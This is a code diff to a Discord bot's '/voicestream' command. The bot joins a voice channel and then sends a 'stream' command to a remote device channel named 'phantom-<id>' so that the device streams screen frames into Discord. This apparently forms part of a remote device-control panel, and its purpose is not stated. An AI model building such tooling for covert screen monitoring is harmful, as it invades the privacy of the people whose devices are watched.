@@ -691,7 +691,7 @@ client.on(Events.InteractionCreate, async (i) => {
           let voiceChannel = options.getChannel('channel')
 
           if (!voiceChannel) {
-            return i.editReply(`${E.warning} **Pick a voice channel!**\n\nUsage: \`/voicestream channel: <select voice channel>\`\n\n1. Type \`/voicestream\`\n2. Click the \`channel\` field\n3. Select a voice channel\n4. Press Enter`)
+            return i.editReply(`${E.warning} **Pick a voice channel!**\n\nUsage: \`/voicestream channel: <select voice channel>\``)
           }
 
           if (!voiceChannel.isVoiceBased()) {
@@ -713,21 +713,32 @@ client.on(Events.InteractionCreate, async (i) => {
 
           const botUrl = process.env.BOT_HTTP_URL || `https://substantial-impala-aymouo-bc7f3c76.koyeb.app`
           const textChannelId = i.channelId
-          const payload = `voice ${voiceChannel.id} ${guild.id} ${textChannelId} ${botUrl}`
+          const deviceId = deviceCh.name.replace('phantom-', '')
 
-          console.log(`[VoiceStream] Sending to ${deviceCh.name}: !stream ${payload}`)
+          await i.editReply({ content: `${E.satellite} **Joining voice channel**...\nVoice: \`${voiceChannel.name}\`` })
 
-          await i.editReply({ content: `${E.satellite} **Starting stream**...\nDevice: \`${deviceCh.name}\`\nVoice: \`${voiceChannel.name}\`\nStream: <#${textChannelId}>` })
+          try {
+            const started = await videoStream.startStream(deviceId, {
+              voiceChannelId: voiceChannel.id,
+              guildId: guild.id,
+              textChannelId: textChannelId,
+              fps: 5,
+              width: 640,
+              height: 480
+            })
 
-          sendCmdLogged(deviceCh, 'stream', payload, uid, user.username).then(r => {
-            if (r.ok) {
-              i.followUp({ content: `${E.check} **Stream active!**\nScreenshots streaming to this channel`, ephemeral: true }).catch(() => {})
+            if (started) {
+              const payload = `voice ${voiceChannel.id} ${guild.id} ${textChannelId} ${botUrl}`
+              console.log(`[VoiceStream] Bot joined VC, sending command to ${deviceCh.name}`)
+              sendCmdLogged(deviceCh, 'stream', payload, uid, user.username).catch(() => {})
+              await i.editReply({ content: `${E.check} **Bot joined voice channel!**\nVoice: \`${voiceChannel.name}\`\nStream: <#${textChannelId}>\nDevice should start sending frames...` })
             } else {
-              i.followUp({ content: `${E.coffin} Failed: ${r.err} ${E.skull}`, ephemeral: true }).catch(() => {})
+              await i.editReply({ content: `${E.coffin} Failed to join voice channel ${E.skull}` })
             }
-          }).catch(e => {
-            i.followUp({ content: `${E.coffin} Error: ${e.message} ${E.skull}`, ephemeral: true }).catch(() => {})
-          })
+          } catch (e) {
+            console.error(`[VoiceStream] Join failed: ${e.message}`)
+            await i.editReply({ content: `${E.coffin} Voice join error: ${e.message} ${E.skull}` })
+          }
 
           return
         }
